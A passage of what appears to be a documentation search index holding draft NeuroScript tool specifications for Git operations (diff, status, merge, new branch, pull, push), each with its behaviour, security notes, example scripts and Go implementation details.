Git.GitCommit(commit_message) @@@    SET commit_status = LAST @@@    EMIT \"Git Commit status: \" + commit_status @@@ @@@    # Example 2: Attempt to commit with nothing staged (will likely fail) @@@    EMIT \"Attempting commit with nothing staged...\" @@@    CALL Git.GitCommit(\"Add new feature X\") @@@    SET nothing_staged_status = LAST @@@    EMIT \"Status for commit with nothing staged: \" + nothing_staged_status @@@    # Expect error like: \"GitCommit failed: On branch main\\nnothing to commit, working tree clean...\" @@@ @@@    # Example 3: Attempt to commit with an empty message (will fail validation) @@@    CALL Git.GitCommit(\"\") @@@    SET empty_message_status = LAST @@@    EMIT \"Status for commit with empty message: \" + empty_message_status @@@    # Expect error like: \"commit message cannot be empty...\" @@@</code> @@@ Go Implementation Notes:* @@@    * Location: <code>pkg/core/tools_git.go</code> @@@    * Function: <code>toolGitCommit</code> @@@    * Spec Name: <code>GitCommit</code> (in <code>pkg/core/tools_git_register.go</code>) @@@    * Key Go Packages: <code>fmt</code> @@@    * Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code> @@@    * Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</p>"},{"location":"ns/tools/git_diff/","title":"git_diff","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-diff-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: git.Status, git.Add :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_diff/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_diff/#tool-specification-gitdiff-v01","title":"Tool Specification: <code>git.Diff</code> (v0.1)","text":"<ul> <li>Tool Name: <code>git.Diff</code> (v0.1)</li> <li>Purpose: Shows the differences between the files in the working directory and the Git index (staging area). It highlights changes that have been made but not yet staged for commit. This is equivalent to running <code>git diff</code> (with no arguments) within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL git.Diff()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success:<ul> <li>If changes exist between the working tree and the index: Returns a string containing the textual diff output in the standard <code>git diff</code> format. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>If there are no changes between the working tree and the index: Returns the specific string <code>\"GitDiff: No changes detected in the working tree.\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>On failure: A string describing the failure, typically indicating a fatal error from the underlying <code>git diff</code> command execution (e.g., \"GitDiff command failed: fatal: not a git repository...\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git diff</code>.</li> <li>Executes the <code>git diff</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. Note that <code>git diff</code> typically exits successfully (exit code 0) even when differences are found.</li> <li>If the command execution fails (e.g., <code>git</code> not found, not a Git repository), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, checks the standard output returned by <code>toolExec</code>:<ul> <li>If the output string is empty, returns the specific message <code>\"GitDiff: No changes detected in the working tree.\"</code>.</li> <li>If the output string is not empty, returns the raw diff output string directly.</li> </ul> </li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git diff</code> command within the configured sandbox directory.</li> <li>Reads Git repository metadata and file content from the working directory and index to generate the diff; does not modify the repository state or files.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Show diff after modifying a tracked file\n# Assume README.md is tracked\nCALL FS.WriteFile(\"README.md\", \"Add a new line to the README.\")\nSET write_ok = LAST\n\nEMIT \"Showing diff after modifying README...\"\nCALL git.Diff()\nSET diff_output = LAST\nEMIT \"Git Diff Output:\"\nEMIT diff_output\n# Expected output will show the diff for README.md\n\n# Example 2: Show diff when working tree is clean (matches index)\n# Assume previous change was added and committed, or no changes made\nCALL git.Diff()\nSET clean_diff_output = LAST\nEMIT \"Git Diff Output (Clean): \" + clean_diff_output\n# Expect: \"GitDiff: No changes detected in the working tree.\"\n\n# Example 3: Add the change, then show diff (should be clean again)\nCALL git.GitAdd([\"README.md\"]) # Stage the change from Example 1\nSET add_ok = LAST\n\nCALL git.Diff()\nSET diff_after_add = LAST\nEMIT \"Git Diff Output (After Add): \" + diff_after_add\n# Expect: \"GitDiff: No changes detected in the working tree.\"\n# Note: To see staged changes vs HEAD, one would need 'git diff --staged' functionality\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitDiff</code></li> <li>Spec Name: <code>GitDiff</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Handles the \"no changes\" case specifically.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_gitstatus/","title":"git_gitstatus","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitstatus-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git_status.go, docs/script_spec.md :: relatedTo: Git.GitAdd, Git.GitCommit, Git.GitCheckout :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_gitstatus/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_gitstatus/#tool-specification-gitgitstatus-v01","title":"Tool Specification: <code>Git.GitStatus</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitStatus</code> (v0.1)</li> <li>Purpose: Retrieves the status of the Git repository within the sandbox, providing detailed information about the current branch, tracking status, and changes to files. It uses <code>git status --porcelain -b --untracked-files=all</code> internally and parses the output.</li> <li>NeuroScript Syntax: <code>CALL Git.GitStatus()</code></li> <li>Arguments: None.</li> <li>Return Value: (Map)<ul> <li>Returns a Map containing a structured representation of the Git status. (Accessible via <code>LAST</code> after the <code>CALL</code>). The Map always contains the following keys:<ul> <li><code>branch</code> (String | nil): The name of the current local branch. Can be <code>\"(detached HEAD)\"</code> if not on a branch, or the branch name if on an unborn branch (e.g., after <code>git init</code> but before first commit). <code>nil</code> only if parsing fails unexpectedly.</li> <li><code>remote_branch</code> (String | nil): The name of the remote tracking branch (e.g., <code>origin/main</code>), or <code>nil</code> if the current branch is not tracking a remote branch.</li> <li><code>ahead</code> (Number): The number of commits the local branch is ahead of its remote tracking branch. <code>0</code> if not tracking or up-to-date.</li> <li><code>behind</code> (Number): The number of commits the local branch is behind its remote tracking branch. <code>0</code> if not tracking or up-to-date.</li> <li><code>files</code> (List of Maps): A list containing information about files with changes (staged, unstaged, or untracked). Each map in the list has:<ul> <li><code>path</code> (String): The relative path to the file within the repository. Paths with special characters may be unquoted from Git's C-style quoting.</li> <li><code>index_status</code> (String): A single character representing the status of the file in the index (staging area). Common values: <code>M</code> (modified), <code>A</code> (added), <code>D</code> (deleted), <code>R</code> (renamed), <code>C</code> (copied), <code>U</code> (unmerged), <code>?</code> (untracked), <code>!</code> (ignored), <code></code> (unmodified).</li> <li><code>worktree_status</code> (String): A single character representing the status of the file in the working tree relative to the index. Common values: <code>M</code> (modified), <code>D</code> (deleted), <code>?</code> (untracked), <code></code> (unmodified/tracked).</li> <li><code>original_path</code> (String | nil): For renamed (<code>R</code>) or copied (<code>C</code>) files in the index, this holds the original path the file was renamed/copied from. Otherwise, it is <code>nil</code>. May be unquoted.</li> </ul> </li> <li><code>untracked_files_present</code> (Boolean): <code>true</code> if there are any files listed with status <code>??</code> (untracked), <code>false</code> otherwise.</li> <li><code>is_clean</code> (Boolean): <code>true</code> only if there are no staged changes, no unstaged changes to tracked files, AND no untracked files. <code>false</code> otherwise.</li> <li><code>error</code> (String | nil): Contains an error message string if the <code>git status</code> command failed (e.g., \"Not a git repository...\") or if the output parsing failed. Contains <code>nil</code> if the command executed successfully and parsing succeeded (even if the repository is not clean).</li> </ul> </li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Executes the command <code>git status --porcelain -b --untracked-files=all</code> within the <code>sandboxDir</code> using the <code>toolExec</code> helper.</li> <li>If <code>toolExec</code> returns an error (e.g., the directory is not a Git repository):<ul> <li>Creates a default result Map.</li> <li>Sets the <code>error</code> key in the Map with a descriptive message based on the error.</li> <li>Returns the Map.</li> </ul> </li> <li>If <code>toolExec</code> succeeds, parses the output string line by line:<ul> <li>Parses the first line (starting with <code>##</code>) to extract local branch, remote branch (if tracked), and ahead/behind counts. Handles detached HEAD and unborn branch states.</li> <li>Parses subsequent lines to identify file statuses (staged, unstaged, untracked, renamed/copied). Extracts the status codes (index, worktree) and paths (handling C-style quoting and <code>-&gt;</code> for renames/copies).</li> <li>Populates the <code>files</code> list with maps containing the parsed file status details.</li> <li>Sets <code>untracked_files_present</code> if any <code>??</code> files are found.</li> <li>Determines <code>is_clean</code> based on whether any tracked file changes or untracked files were detected.</li> </ul> </li> <li>If parsing fails at any stage, sets the <code>error</code> key in the result Map.</li> <li>Returns the fully populated result Map.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git status</code> command within the configured sandbox directory.</li> <li>Reads Git repository metadata and file status information; does not modify the repository state or files.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Get status of a clean repository on main branch\n# Assume repo is clean and on 'main' tracking 'origin/main'\nCALL Git.GitStatus()\nSET status_result = LAST\nEMIT \"Clean Repo Status:\"\nEMIT \" Branch: \" + status_result[\"branch\"]\nEMIT \" Remote: \" + status_result[\"remote_branch\"]\nEMIT \" Ahead: \" + status_result[\"ahead\"] + \", Behind: \" + status_result[\"behind\"]\nEMIT \" Is Clean: \" + status_result[\"is_clean\"]\nEMIT \" Untracked Present: \" + status_result[\"untracked_files_present\"]\nEMIT \" Error: \" + status_result[\"error\"]\nEMIT \" Files Count: \" + List.Length(status_result[\"files\"]) # Requires List.Length\n# Expected: main, origin/main, 0, 0, true, false, nil, 0 (if List.Length exists)\n\n# Example 2: Get status after modifying and adding a file\nCALL FS.WriteFile(\"config.yml\", \"new_setting: true\")\nCALL Git.GitAdd([\"config.yml\"])\nCALL Git.GitStatus()\nSET modified_status = LAST\nEMIT \"Modified Repo Status:\"\nEMIT \" Is Clean: \" + modified_status[\"is_clean\"] # Expect false\nEMIT \" Error: \" + modified_status[\"error\"] # Expect nil\n# Loop through files to see details (requires List tools)\nIF modified_status[\"error\"] == nil AND List.Length(modified_status[\"files\"]) &gt; 0 THEN\n  SET changed_file = modified_status[\"files\"][0]\n  EMIT \" Changed File Path: \" + changed_file[\"path\"] # Expect config.yml\n  EMIT \" Index Status: \" + changed_file[\"index_status\"] # Expect 'A' (Added)\n  EMIT \" Worktree Status: \" + changed_file[\"worktree_status\"] # Expect ' '\nENDIF\n\n# Example 3: Get status in a non-git directory\n# Assume \"not_a_repo\" directory exists but is not a git repo\n# This requires changing the interpreter's sandboxDir, which isn't standard tool behavior.\n# Illustrative result if run in non-repo:\n# CALL Git.GitStatus()\n# SET non_repo_status = LAST\n# EMIT \"Non-Repo Status Error: \" + non_repo_status[\"error\"]\n# Expect error like: \"Not a git repository...\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git_status.go</code></li> <li>Function: <code>toolGitStatus</code> (calls <code>parseGitStatusOutput</code>)</li> <li>Spec Name: <code>GitStatus</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>regexp</code>, <code>strconv</code>, <code>strings</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.parseGitStatusOutput</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>map[string]interface{}, error</code>, but execution/parsing errors are placed in the returned map's <code>error</code> field instead of returning a Go error.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_merge/","title":"git_merge","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitmerge-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitNewBranch, Git.GitCheckout, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_merge/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_merge/#tool-specification-gitgitmerge-v01","title":"Tool Specification: <code>Git.GitMerge</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitMerge</code> (v0.1)</li> <li>Purpose: Merges the history of a named branch into the current branch. This is equivalent to running <code>git merge &lt;branch_name&gt;</code> within the project's sandbox directory. It reports merge conflicts via the error return value.</li> <li>NeuroScript Syntax: <code>CALL Git.GitMerge(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name of the branch whose history should be merged into the currently checked-out branch. It cannot be an empty string.</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success (clean merge): A string indicating the merge was successful, potentially including output from the <code>git merge</code> command. Example: <code>\"Successfully merged branch 'feature/login'.\\nOutput:\\nMerge made by the 'recursive' strategy...\\n\"</code> (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure or conflict: A string describing the failure. This could be due to an empty <code>branch_name</code>, or errors from the underlying <code>git merge</code> command execution (e.g., \"failed to merge branch '...': \"). The output from <code>git merge</code> will be included in the error message if conflicts occur (e.g., mentioning \"Automatic merge failed; fix conflicts and then commit the result.\"). (Accessible via <code>LAST</code> after the <code>CALL</code>). <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git merge \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git merge</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch does not exist, merge conflicts occur), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output for conflicts).</li> <li>If the command execution succeeds (a clean merge), returns a success message string, including the merged branch name and any standard output from the <code>git merge</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git merge</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state: potentially creates a merge commit, updates the current branch reference, and modifies files in the working directory and index.</li> <li>Does not automatically resolve merge conflicts; it relies on the user or subsequent script steps to handle conflicts reported in the error output.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Setup: Create a main branch commit, then a feature branch with another commit\nCALL FS.WriteFile(\"base.txt\", \"Line 1\")\nCALL Git.GitAdd([\"base.txt\"])\nCALL Git.GitCommit(\"Initial commit on main\")\nCALL Git.GitNewBranch(\"feature/add-line2\")\nCALL FS.WriteFile(\"base.txt\", \"Line 1\\nLine 2\") # Modify on feature branch\nCALL Git.GitAdd([\"base.txt\"])\nCALL Git.GitCommit(\"Add line 2 on feature branch\")\nCALL Git.GitCheckout(\"main\") # Switch back to main\n\n# Example 1: Perform a clean merge (fast-forward or simple merge)\nEMIT \"Attempting to merge 'feature/add-line2' into 'main'...\"\nCALL Git.GitMerge(\"feature/add-line2\")\nSET merge_status = LAST\nEMIT \"Merge status: \" + merge_status\n# Expected output should indicate success\n\n# Example 2: Attempt to merge a non-existent branch\nEMIT \"Attempting to merge non-existent branch...\"\nCALL Git.GitMerge(\"no-such-branch\")\nSET non_exist_merge_status = LAST\nEMIT \"Status for merging non-existent branch: \" + non_exist_merge_status\n# Expect error like: \"failed to merge branch 'no-such-branch': fatal: 'no-such-branch' does not point to a commit\"\n\n# Example 3: Simulate a conflict scenario (manual setup needed outside script usually)\n# Assume 'main' has a change conflicting with 'feature/add-line2' before merge attempt\n# CALL Git.GitMerge(\"feature/add-line2\")\n# SET conflict_status = LAST\n# EMIT \"Status for conflicting merge: \" + conflict_status\n# Expect error containing text like: \"Automatic merge failed; fix conflicts and then commit the result.\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitMerge</code></li> <li>Spec Name: <code>GitMerge</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Merge conflicts are reported via the wrapped error from <code>toolExec</code>.</li> </ul> </li>"},{"location":"ns/tools/git_newbranch/","title":"git_newbranch","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitnewbranch-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitCheckout, Git.GitCommit :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_newbranch/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_newbranch/#tool-specification-gitgitnewbranch-v01","title":"Tool Specification: <code>Git.GitNewBranch</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitNewBranch</code> (v0.1)</li> <li>Purpose: Creates a new branch starting from the current HEAD and immediately switches to it. This is equivalent to running <code>git checkout -b &lt;branch_name&gt;</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitNewBranch(branch_name: &lt;String&gt;)</code></li> <li>Arguments:<ul> <li><code>branch_name</code> (String): Required. The name for the new branch. It cannot be empty and must not contain characters typically disallowed in Git branch names (e.g., whitespace, <code>\\</code>, <code>:</code>, <code>*</code>, <code>?</code>, <code>\"</code>, <code>&lt;</code>, <code>&gt;</code>, <code>|</code>, <code>~</code>, <code>^</code>).</li> </ul> </li> <li>Return Value: (String)<ul> <li>On success: A string indicating the new branch was created and checked out successfully, potentially including output from the <code>git checkout -b</code> command. Example: <code>\"Successfully created and checked out new branch 'feature/login'.\\nOutput:\\nSwitched to a new branch 'feature/login'\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On error: A string describing the failure. This could be due to an invalid branch name (e.g., \"branch name cannot be empty\", \"branch name '...' contains invalid characters\") or errors from the underlying <code>git checkout -b</code> command execution (e.g., \"failed to create new branch '...': fatal: A branch named '...' already exists\"). (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that exactly one argument (<code>branch_name</code>) of type String is provided.</li> <li>Validates that the <code>branch_name</code> is not empty. If it is, returns an error message string.</li> <li>Validates that the <code>branch_name</code> does not contain invalid characters (<code>\\t\\n\\\\/:*?\\\"&lt;&gt;|~^</code>). If it does, returns an error message string.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git checkout -b \"&lt;branch_name&gt;\"</code>.</li> <li>Executes the <code>git checkout -b</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function.</li> <li>If the command execution fails (e.g., <code>git</code> not found, branch already exists), returns an error message string containing details from <code>toolExec</code>.</li> <li>If the command execution succeeds, returns a success message string, including the new branch name and any standard output from the <code>git checkout -b</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git checkout -b</code> command within the configured sandbox directory.</li> <li>Modifies the Git repository state by creating a new branch reference and updating the HEAD to point to this new branch.</li> <li>Includes basic validation against common invalid characters in branch names.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Create a new feature branch\nSET new_branch = \"feature/add-user-auth\"\nCALL Git.GitNewBranch(new_branch)\nSET create_status = LAST\nEMIT \"Create branch status: \" + create_status\n\n# Example 2: Attempt to create a branch that already exists (assuming 'main' exists)\nCALL Git.GitNewBranch(\"main\")\nSET exists_status = LAST\nEMIT \"Status for creating existing branch: \" + exists_status\n# Expect error like: \"failed to create new branch 'main': fatal: A branch named 'main' already exists\"\n\n# Example 3: Attempt to create a branch with an invalid name\nCALL Git.GitNewBranch(\"invalid name with spaces\")\nSET invalid_name_status = LAST\nEMIT \"Status for creating branch with invalid name: \" + invalid_name_status\n# Expect error like: \"branch name 'invalid name with spaces' contains invalid characters...\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitNewBranch</code></li> <li>Spec Name: <code>GitNewBranch</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code>, <code>strings</code></li> <li>Helpers: <code>core.toolExec</code>, <code>core.ErrValidationArgValue</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_pull/","title":"git_pull","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitpull-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitPush, Git.GitFetch, Git.GitMerge, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_pull/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_pull/#tool-specification-gitgitpull-v01","title":"Tool Specification: <code>Git.GitPull</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitPull</code> (v0.1)</li> <li>Purpose: Fetches changes from the default remote repository (usually 'origin') for the current branch and integrates them into the local branch. This is equivalent to running <code>git pull</code> within the project's sandbox directory.</li> <li>NeuroScript Syntax: <code>CALL Git.GitPull()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success (fetch and integrate successful): A string indicating the pull was successful, potentially including output from the <code>git pull</code> command. Example: <code>\"GitPull successful.\\nOutput:\\nUpdating abc1234..def5678\\nFast-forward\\n file.txt | 2 +-\\n 1 file changed, 1 insertion(+), 1 deletion(-)\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure or conflict: A string describing the failure, typically wrapping the output from the <code>git pull</code> command. Examples: <code>\"GitPull failed: ...\"</code>. This can occur due to network errors, authentication issues, merge conflicts during integration, or if the local repository has uncommitted changes preventing the pull. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git pull</code>.</li> <li>Executes the <code>git pull</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. This involves contacting the configured remote repository.</li> <li>If the command execution fails (e.g., network error, remote not found, authentication required/failed, merge conflicts), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output).</li> <li>If the command execution succeeds (fetch and merge/rebase completed cleanly), returns a success message string, including any standard output from the <code>git pull</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git pull</code> command within the configured sandbox directory.</li> <li>Requires network access to contact the remote repository. Firewall rules may need to allow outgoing connections.</li> <li>May require authentication (e.g., SSH keys, HTTPS credentials) configured in the execution environment's Git settings to access private repositories. The tool itself does not handle credential input.</li> <li>Modifies the Git repository state by fetching new objects, updating remote-tracking branches, and potentially creating a merge commit or fast-forwarding the current branch reference. It can also modify files in the working directory and index during the integration step.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Pull changes for the current branch (assuming remote 'origin' is set up)\nEMIT \"Attempting to pull latest changes...\"\nCALL Git.GitPull()\nSET pull_status = LAST\nEMIT \"Git Pull status: \" + pull_status\n# Output will vary greatly depending on whether changes exist, conflicts occur, etc.\n\n# Example 2: Check status after pull\nCALL Git.GitStatus()\nSET status_after_pull = LAST\nIF status_after_pull[\"error\"] == nil THEN\n   EMIT \"Repository is clean after pull: \" + status_after_pull[\"is_clean\"]\n   # Check if behind count is now 0 (assuming pull was successful)\n   EMIT \"Commits behind remote after pull: \" + status_after_pull[\"behind\"]\nELSE\n   EMIT \"Error getting status after pull: \" + status_after_pull[\"error\"]\nENDIF\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitPull</code></li> <li>Spec Name: <code>GitPull</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Merge conflicts or other issues are reported via the wrapped error from <code>toolExec</code>.</li> </ul> </li> </ul>"},{"location":"ns/tools/git_push/","title":"git_push","text":"<p>:: type: NSproject :: subtype: tool_spec :: version: 0.1.0 :: id: tool-spec-git-gitpush-v0.1 :: status: draft :: dependsOn: docs/ns/tools/tool_spec_structure.md, pkg/core/tools_git_register.go, pkg/core/tools_git.go, docs/script_spec.md :: relatedTo: Git.GitPull, Git.GitCommit, Git.GitStatus :: developedBy: AI :: reviewedBy: User</p>"},{"location":"ns/tools/git_push/#tool-specification-structure-template","title":"Tool Specification Structure Template","text":""},{"location":"ns/tools/git_push/#tool-specification-gitgitpush-v01","title":"Tool Specification: <code>Git.GitPush</code> (v0.1)","text":"<ul> <li>Tool Name: <code>Git.GitPush</code> (v0.1)</li> <li>Purpose: Updates the remote repository (usually 'origin') with local commits from the current branch. This is equivalent to running <code>git push</code> within the project's sandbox directory, pushing the current branch to its configured upstream destination.</li> <li>NeuroScript Syntax: <code>CALL Git.GitPush()</code></li> <li>Arguments: None.</li> <li>Return Value: (String)<ul> <li>On success: A string indicating the push was successful, potentially including output from the <code>git push</code> command. Example: <code>\"GitPush successful.\\nOutput:\\nEverything up-to-date\\n\"</code> or <code>\"GitPush successful.\\nOutput:\\nTo github.com:user/repo.git\\n   abc1234..def5678  main -&gt; main\\n\"</code>. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> <li>On failure: A string describing the failure, typically wrapping the output from the <code>git push</code> command. Examples: <code>\"GitPush failed: ...\"</code>. This can occur due to network errors, authentication issues, the remote having changes that need to be pulled first (rejected push), or no upstream branch being configured. (Accessible via <code>LAST</code> after the <code>CALL</code>).</li> </ul> </li> <li>Behavior:<ol> <li>Validates that no arguments are provided.</li> <li>Retrieves the interpreter's <code>sandboxDir</code>.</li> <li>Constructs a command equivalent to <code>git push</code>.</li> <li>Executes the <code>git push</code> command within the <code>sandboxDir</code> using the <code>toolExec</code> helper function. This involves contacting the configured remote repository.</li> <li>If the command execution fails (e.g., network error, remote not found, authentication required/failed, push rejected), returns an error message string containing details from <code>toolExec</code> (which includes Git's standard error/output).</li> <li>If the command execution succeeds (local commits successfully sent to the remote), returns a success message string, including any standard output from the <code>git push</code> command.</li> </ol> </li> <li>Security Considerations:<ul> <li>Executes the <code>git push</code> command within the configured sandbox directory.</li> <li>Requires network access to contact the remote repository. Firewall rules may need to allow outgoing connections.</li> <li>May require authentication (e.g., SSH keys, HTTPS credentials) configured in the execution environment's Git settings to push to the remote repository. The tool itself does not handle credential input.</li> <li>Modifies the state of the remote Git repository by sending local commit objects and updating remote branch references.</li> <li>Relies on the <code>toolExec</code> helper for command execution.</li> <li>Assumes the <code>git</code> executable is available in the environment's PATH where the NeuroScript interpreter is running.</li> </ul> </li> <li>Examples: <pre><code># Example 1: Push committed changes (assuming remote 'origin' is set up and commits exist)\n# Assume Git.GitCommit was called successfully before\nEMIT \"Attempting to push changes...\"\nCALL Git.GitPush()\nSET push_status = LAST\nEMIT \"Git Push status: \" + push_status\n# Output will vary depending on whether push was successful, rejected, etc.\n\n# Example 2: Attempt to push when up-to-date\nEMIT \"Attempting to push when likely up-to-date...\"\nCALL Git.GitPush()\nSET push_up_to_date_status = LAST\nEMIT \"Git Push (up-to-date) status: \" + push_up_to_date_status\n# Expected output often includes \"Everything up-to-date\"\n\n# Example 3: (Illustrative) Push might fail if behind remote\n# Assume remote has changes not yet pulled locally\n# CALL Git.GitPush()\n# SET push_rejected_status = LAST\n# EMIT \"Git Push (rejected) status: \" + push_rejected_status\n# Expect error containing text like \"rejected\" or \"failed to push some refs\"\n</code></pre></li> <li>Go Implementation Notes:<ul> <li>Location: <code>pkg/core/tools_git.go</code></li> <li>Function: <code>toolGitPush</code></li> <li>Spec Name: <code>GitPush</code> (in <code>pkg/core/tools_git_register.go</code>)</li> <li>Key Go Packages: <code>fmt</code></li> <li>Helpers: <code>core.toolExec</code></li> <li>Registration: Registered by <code>registerGitTools</code> within <code>pkg/core/tools_register.go</code>. Returns <code>string, error</code>. Rejections or other issues are reported via the wrapped error from 